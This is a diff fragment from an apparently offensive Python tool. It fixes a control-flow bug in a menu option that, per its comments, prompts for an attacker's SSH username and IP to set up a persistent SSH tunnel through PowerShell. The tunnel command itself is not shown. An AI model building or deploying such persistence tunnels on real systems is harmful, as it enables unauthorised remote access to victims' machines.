@@ -127,10 +127,9 @@ while True:
     if action == "3":
         print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell before this action!!!")
         attackerscriptcontinue=input("Continue? y/n: ")
-        while True:
         if attackerscriptcontinue == "n":
             print("Will not continue...")
-        elif attackerscriptcontinue == "y":
+        else:
             #stating the PS comand to persistent SSH tunnel
             attackeruser=input("Enter attacker SSH username: ")
             attackerip=input("Enter attacker IP (without port): ")
